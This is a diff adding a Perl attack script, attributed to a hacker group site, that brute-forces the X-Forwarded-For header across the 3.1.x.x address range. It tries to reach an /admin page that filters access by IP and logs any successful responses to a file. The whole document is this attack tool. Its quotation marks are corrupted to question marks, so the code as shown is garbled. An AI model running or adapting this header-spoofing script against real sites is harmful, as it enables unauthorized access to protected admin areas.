@@ -1,0 +1,37 @@
+# !/usr/bin/perl
+# Code By JosS & hypno
+
+use HTTP::Request;
+use LWP::UserAgent;
+
+$contador1=0;
+$contador2=0;
+
+while($contador1<=255)
+{
+while($contador2<=255)
+{
+print ?Comprobando: 3.1.$contador1.$contador2\n?;
+my $web=?http://www.localhost/admin?;
+my $header=?X-Forwarded-For: 3.1.$contador1.$contador2?;
+my $respuesta=HTTP::Request->new(GET=>$web);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(30);
+$ua->default_header(?X-Forwarded-For? => ?3.1.$contador1.$contador2?);
+my $response=$ua->request($respuesta);
+
+if ($response->is_success)
+{
+$contenido=$response->content;
+open(FILE,?>>results.txt?);
+print FILE ?$contenido\n?;
+close(FILE);
+}
+
+$contador2++;
+}
+$contador1++;
+$contador2=0;
+}
+
+# spanish-hackers.com
